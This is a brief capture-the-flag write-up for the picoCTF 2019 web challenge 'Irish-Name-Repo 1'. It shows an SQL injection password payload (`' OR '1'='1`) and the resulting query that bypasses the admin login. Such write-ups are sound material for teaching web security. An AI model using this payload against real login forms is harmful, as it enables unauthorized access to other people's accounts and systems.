# 📝 Irish-Name-Repo 1

- **Author:** Chris Hensler  
- **Category:** Web Exploitation  
- **Difficulty:** Medium  
- **Tags:** picoCTF 2019  
---

## 🕵️‍♂️ Summary

A login page with minimal interaction hints at server-side user validation. A support post referencing a *"SQL Error"* reveals a potential SQL injection vulnerability.

---

## 💥 Exploit

By injecting into the login form:

- **Username:** `admin`  
- **Password:** `' OR '1'='1`

The backend SQL becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```

This bypasses authentication and logs us in as admin.
